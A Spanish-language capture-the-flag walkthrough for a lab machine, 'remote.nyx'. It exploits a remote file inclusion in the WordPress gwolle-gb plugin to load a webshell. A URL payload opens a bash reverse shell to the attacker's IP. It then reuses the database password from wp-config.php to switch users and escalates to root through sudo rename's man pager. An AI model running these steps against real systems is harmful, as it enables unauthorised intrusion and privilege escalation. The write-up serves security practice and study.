PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

-Hacemos Fuzzing y encontramos la ruta /wordpress

-Añadimos remote.nyx al /etc/hosts

-Enumeramos con wpscan y encontramos el Plugin 'gwolle-gb' de versión 1.5.3 , la cual es vulnerable a **Remote File Inclusion (RFI)**:
	-Ref --> https://www.exploit-db.com/exploits/38861

-Para hacer la prueba, levantamos un servidor con Python y probamos a hacer una petición desde la URl , aprovechando el RFI:
	-http://remote.nyx/wordpress/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://192.168.1.135/
		-En nuestro servidor:
			-"GET /wp-load.php HTTP/1.0"

-FUNCIONA!! , pero hace la petición por defecto a un archivo con nombre 'wp-load.php'

-Nos creamos un archivo con nombre 'wp-load.php' , con el contenido de una webshell, para poder ejecutar comandos y ganar acceso a la máquina:
	-Levantamos servidor:
		-python3 -m http.server 80
	-Desde la URl:
		-http://remote.nyx/wordpress/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://192.168.1.135/&cmd=bash -c 'bash -i >%26 /dev/tcp/192.168.1.135/1234 0>%261'
			www-data@remote:/$ whoami
				www-data

## Escalada de Privilegios

-Contenido del archivo wp-config.php:
	/** Database username */
	define( 'DB_USER', 'root' );
	/** Database password */
	define( 'DB_PASSWORD', 'WPr00t3d123!' );

-Entramos a mysql y encontramos el hash de tiago:
	$P$B52vquBTkRBCKwoEj5j7SrvfrfMbD2.

-Lo rompemos con john:
	-john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
		NO LO CONSIGUE ROMPER

-Probamos la contraseña de mysql con el usuario 'tiago':
	-su tiago
	-Password: WPr00t3d123!
		tiago@remote:/$ whoami
			tiago

-sudo -l:
	-(root) NOPASSWD: /usr/bin/rename

-sudo -u root /usr/bin/rename --man
	!/bin/bash
		root@remote:/# whoami
			root
